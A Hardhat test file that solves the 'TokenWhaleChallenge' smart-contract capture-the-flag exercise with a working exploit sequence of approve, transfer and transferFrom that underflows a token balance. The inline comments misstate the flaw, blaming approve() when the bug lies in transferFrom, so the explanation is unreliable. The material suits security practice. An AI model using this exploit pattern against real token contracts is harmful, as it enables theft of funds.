import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';

describe('TokenWhaleChallenge', () => {
  let target: Contract;
  let user1: SignerWithAddress;
  let user2: SignerWithAddress;
  let user3: SignerWithAddress;

  before(async () => {
    [user1, user2, user3] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('TokenWhaleChallenge', user1)
    ).deploy(user1.address);

    await target.deployed();


  });



  it('exploit', async () => {

    /* key to this challenge is that there is no require() statement in the approve() function that requires the approver to be the spender. this allows user2 to approve spending user1's tokens!
    */

    // connect with user2 address instead of user1 address for approval
    target = target.connect(user2);
    await target.approve(user1.address, 1000);

    // connect with user1 address for transfer and transferFrom
    target = target.connect(user1);
    await target.transfer(user2.address, 501);

    /* now user1 can exploit the transferFrom function by setting the from value to be different from the msg.sender value
    */
    await target.transferFrom(user2.address, user3.address, 500);

    expect(await target.isComplete()).to.equal(true);
  });
});
